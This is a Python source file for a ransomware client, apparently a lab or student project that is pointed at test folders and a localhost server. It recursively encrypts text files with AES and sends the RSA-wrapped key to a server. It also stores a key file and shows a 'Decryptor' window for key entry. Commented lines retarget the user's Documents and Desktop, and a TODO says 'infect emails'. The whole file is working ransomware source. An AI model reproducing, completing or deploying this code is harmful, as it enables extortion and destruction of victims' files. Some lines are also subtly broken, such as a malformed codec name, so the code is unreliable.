import os
import binascii

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
import base64
import tkinter as tk
import pyperclip

import socket

# Constants
BLOCK_SIZE = 32  # Bytes
USERNAME = os.getlogin()  # Fetch USERNAME
test_folder_path = "C:\\Users\\lenovo\\Downloads\\Documents"
public_key_test_path = "C:\\Users\\lenovo\\Downloads\\Public_Keys"


# Encryption / Decryption Helper Functions
def generate_aes_key():
    return binascii.b2a_hex(os.urandom(16))


def encrypt_aes(file_name, aes_key):
    file = open(file_name, mode='rb')
    plaintext = file.read()
    plaintext = pad(plaintext, BLOCK_SIZE)
    file.close()

    cipher = AES.new(aes_key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)

    file = open(file_name, mode='wb')
    file.write(ciphertext)
    file.close()


def decrypt_aes(file_name, aes_key):
    file = open(file_name, mode='rb')
    ciphertext = file.read()
    file.close()

    cipher = AES.new(aes_key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, BLOCK_SIZE)
    plaintext = plaintext.decode('`latin-1`')

    file = open(file_name, mode='w')
    file.write(plaintext)
    file.close()


def encrypt_rsa(a_message, key):
    encryptor = PKCS1_OAEP.new(key)
    encrypted_msg = encryptor.encrypt(a_message)
    # print(encrypted_msg)
    encoded_encrypted_msg = base64.b64encode(encrypted_msg)
    # print(encoded_encrypted_msg)
    return encoded_encrypted_msg


# Encrypting / Decrypting Files
def encrypt_files(aes_key):
    print("Encrypted Files:")
    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
    directory = os.fsencode(test_folder_path)
    _encrypt_files(aes_key, directory)


def _encrypt_files(aes_key, root_directory):
    for file in os.listdir(root_directory):
        full_path = os.path.join(root_directory, file)
        if os.path.isdir(full_path):
            _encrypt_files(aes_key, full_path)
        else:
            filename = os.fsdecode(file)
            if filename.endswith(".txt"):
                file_full_path = os.path.join(root_directory.decode('latin-1'), filename)
                print(file_full_path)
                encrypt_aes(file_full_path, aes_key)


def decrypt_files(aes_key):
    print("Decrypted Files:")
    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
    directory = os.fsencode(test_folder_path)
    _decrypt_files(aes_key, directory)


def _decrypt_files(aes_key, root_directory):
    for file in os.listdir(root_directory):
        full_path = os.path.join(root_directory, file)
        if os.path.isdir(full_path):
            _decrypt_files(aes_key, full_path)
        else:
            filename = os.fsdecode(file)
            if filename.endswith(".txt"):
                file_full_path = os.path.join(root_directory.decode('latin-1'), filename)
                print(file_full_path)
                decrypt_aes(file_full_path, aes_key)


# Saving / Loading Public Key
def store_public_key_on_desktop(public_key):
    # file = open(
    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
    file = open(public_key_test_path + '\\PublicKey.key', 'w')
    public_key_bytes = public_key.export_key('PEM')
    public_key_str = public_key_bytes.decode("latin-1")
    file.write(public_key_str)
    file.close()


def read_public_key_from_desktop():
    # file = open(
    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
    file = open(public_key_test_path + '\\PublicKey.key', 'r')
    public_key_str = file.read()
    public_key_bytes = public_key_str.encode("latin-1")
    key = RSA.import_key(public_key_bytes)
    return key


# Communicating With Server
def send_to_server(msg):
    SERVER_IP = 'localhost'
    SERVER_PORT = 5678

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((SERVER_IP, SERVER_PORT))

    server_socket.send(msg)
    data = server_socket.recv(1024)

    server_socket.close()
    return data


def generate_public_key():
    public_key = send_to_server('get_public_key'.encode('latin-1'))
    key = RSA.import_key(public_key)
    print('Received Public Key From Server: ' + str(key))
    return key


def send_encrypted_aes_to_server(encrypted_aes_key, public_key):
    send_to_server('post_encrypted_aes'.encode('latin-1'.strip()))
    send_to_server(encrypted_aes_key)
    response = send_to_server(public_key.export_key('PEM'))
    print(response)


def get_decrypted_aes(public_key):
    send_to_server('get_decrypted_aes'.encode('latin-1'))
    decrypted_aes_key = send_to_server(public_key.export_key('PEM'))
    print('Received Decrypted AES Key From Server: ' + str(decrypted_aes_key))
    return decrypted_aes_key


# Client Endpoints
def decryptor():
    # get stored public key
    public_key = read_public_key_from_desktop()

    print('Public Key: ' + str(public_key))
    # get decrypted aes key from the server
    aes_key = get_decrypted_aes(public_key)
    print('AES Key: ' + str(aes_key))
    # decrypt the files with aes key
    decrypt_files(aes_key)


def encryptor():
    # generate aes key
    aes_key = generate_aes_key()

    # encrypt files with aes key
    encrypt_files(aes_key)

    # get public key
    public_key = generate_public_key()

    # encrypt aes key with public key
    encrypted_aes_key = encrypt_rsa(aes_key, public_key)

    # send encrypted aes key to the server, paired with the public key
    send_encrypted_aes_to_server(encrypted_aes_key, public_key)

    # store public key on the desktop
    store_public_key_on_desktop(public_key)

    # TODO: infect emails


def show_gui():
    def submit_public_key():
        public_key_str = public_key_entry.get()
        try:
            public_key = RSA.import_key(public_key_str.encode("latin-1"))
            aes_key = get_decrypted_aes(public_key)
            decrypt_files(aes_key)
            aes_key_label.config(text="Files Decrypted Successfully")

        except (ValueError, IndexError):
            aes_key_label.config(text="Invalid Public Key")

    window = tk.Tk()
    window.title("Decryptor")
    window.geometry("600x400")

    font_size = 14

    public_key_label = tk.Label(window, text="Enter Key to decrypt:", font=("Arial", font_size))
    public_key_label.pack(pady=10)

    public_key_entry = tk.Entry(window, font=("Arial", font_size))
    public_key_entry.pack(pady=10)

    submit_button = tk.Button(window, text="Submit", command=submit_public_key, font=("Arial", font_size))
    submit_button.pack(pady=10)

    aes_key_label = tk.Label(window, text="", font=("Arial", font_size))
    aes_key_label.pack(pady=10)

    window.mainloop()


if __name__ == "__main__":
    if not os.path.exists(public_key_test_path + '\\PublicKey.key'):
        # First run: Encryption
        encryptor()
    else:
        # Other runs: GUI
        show_gui()
